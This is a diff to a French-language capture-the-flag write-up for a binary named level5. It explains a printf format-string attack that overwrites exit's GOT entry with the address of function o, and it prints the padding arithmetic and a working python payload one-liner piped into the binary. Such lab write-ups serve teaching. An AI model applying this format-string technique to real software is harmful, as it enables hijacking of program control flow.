@@ -25,8 +25,21 @@ objdump -t ./level5 | grep o
 
 Il faut alors ecraser l'adresse pointer par exit par celle de la fonction o afin qu'elle soit executer.
 
-0804 in dec = 2052 - 8 = 2044
-84a4 in dec = 33956 - 2052 = 31904
+Ici on se sert de la largeur des formats de printf pour imprimer des caracteres.
+le 'h' indique que la varible est un short (2 octets), de cette maniere on peut tout ecrire en utilisant 2 adresses seulement
+
+0804 in dec = 2052
+84a4 in dec = 33956
+
+8 caracteres ont deja ete imprime (les 2 adresses), il faut alors les soustraire pour que la valeur ne change pas
+
+2052 - 8 = 2044
+
+Meme soustraction avec ce qui a ete imprime par la suite
+
+33956 - 2052 = 31904
+
+le '4$' permet de remonter la stack de 4 adresses
 
 python -c 'print "\x3A\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/z && cat /tmp/z - | ./level5
 id
